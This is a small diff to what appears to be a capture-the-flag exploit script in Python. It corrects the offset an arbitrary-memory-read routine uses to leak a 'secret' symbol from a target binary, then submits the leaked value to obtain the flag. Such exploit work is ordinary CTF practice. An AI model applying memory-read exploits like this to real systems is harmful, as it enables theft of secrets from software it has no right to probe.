@@ -255,7 +255,7 @@ def arbitrary_read(thd1, thd2, target_addr: int):
 def exploit():
     thd1 = thread_comm()
     thd2 = thread_comm()
-    secret = arbitrary_read(thd1, thd2, elf.symbols['secret'] + 0xc0) 
+    secret = arbitrary_read(thd1, thd2, elf.symbols['secret'] + 0x60) 
     print("Leaked secret::", secret)
 
     flag = thd1.send_flag(secret)
